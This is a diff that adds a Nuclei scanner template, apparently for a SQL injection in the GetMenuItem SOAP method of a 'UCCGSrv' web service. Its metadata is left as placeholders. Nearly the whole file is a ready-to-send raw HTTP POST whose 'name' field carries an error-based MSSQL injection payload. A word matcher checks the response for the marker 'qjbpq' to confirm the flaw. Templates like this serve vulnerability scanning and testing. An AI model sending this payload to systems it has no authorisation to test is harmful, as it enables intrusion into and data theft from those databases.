@@ -1,0 +1,40 @@
+id: rewang-UCCGSrv-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /DataSrvs/UCCGSrv.asmx HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        Cookie: ASP.NET_SessionId=etxlbzrbmcecvsuy1fwjnfzy
+        Upgrade-Insecure-Requests: 1
+        Priority: u=1
+        SOAPAction: http://tempuri.org/GetMenuItem
+        Content-Type: text/xml;charset=UTF-8
+        Host: {{Hostname}}
+        Content-Length: 506
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <tem:GetMenuItem>
+                 <!--type: string-->
+                 <tem:name>gero et') AND 1829 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (1829=1829) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(106)+CHAR(107)+CHAR(113)))-- UwEA</tem:name>
+              </tem:GetMenuItem>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - qjbpq
